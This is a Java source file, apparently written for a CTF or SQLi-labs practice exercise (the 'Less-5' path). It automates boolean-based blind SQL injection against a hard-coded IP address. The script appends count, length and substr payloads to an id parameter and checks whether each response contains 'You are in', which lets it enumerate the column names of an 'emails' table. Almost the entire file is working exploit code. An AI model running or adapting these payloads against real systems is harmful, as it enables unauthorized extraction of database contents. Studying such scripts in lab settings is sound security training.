package cn.xiaoyes.ctf.sql;

import cn.hutool.http.HttpUtil;


/**
 * 盲注脚本
 */
public class BlindNode2 {
    public static void main(String[] args) {


        final String BASE_URL = "http://39.108.237.243:8866/Less-5/?id=1'";

        String payLoads = "abcdefghijklmnopqrstuvwxyz0123456789_";

        String tableName = "emails";
        String dbName = "security";

        String flag = "You are in";


        /*
         * select * from information_schema.columns where table_name = 'sys_user' and table_schema='community';
         * */
        /* 数据列数量 */
        int columnCount = 0;
        for (int i = 1; i < 50; i++) {
            String res = HttpUtil.get(BASE_URL + "and (select count(column_name) from information_schema.columns where table_name = '" + tableName + "' and table_schema='" + dbName + "')=" + i + "--+ ");
            if (res.contains(flag)) {
                columnCount = i;
            }
        }
        System.out.println("数据列数量 => " + columnCount);

        System.out.print("数据列 => ");
        for (int i = 0; i < columnCount; i++) {
            /* 数据列长度 */
            int count = 0;
            for (int j = 1; j < 50; j++) {
                String res = HttpUtil.get(BASE_URL + "and length((select column_name from information_schema.columns where table_name = '" + tableName + "' and table_schema='" + dbName + "' limit " + i + ",1)) = " + j + " --+");
                if (res.contains(flag)) {
                    count = j;
                }
            }
            /* 数据列名称 */
            StringBuilder sb = new StringBuilder();
            for (int k = 1; k <= count; k++) {
                for (int s = 0; s < payLoads.length(); s++) {
                    String res = HttpUtil.get(BASE_URL + "and substr((select column_name from information_schema.columns where table_name = '" + tableName + "' and table_schema='" + dbName + "' limit " + i + ",1)," + k + ",1)='" + payLoads.charAt(s) + "' --+");
                    if (res.contains(flag)) {
                        sb.append(payLoads.charAt(s));
                    }
                }
            }
            System.out.print(sb + " ");
        }
    }
}
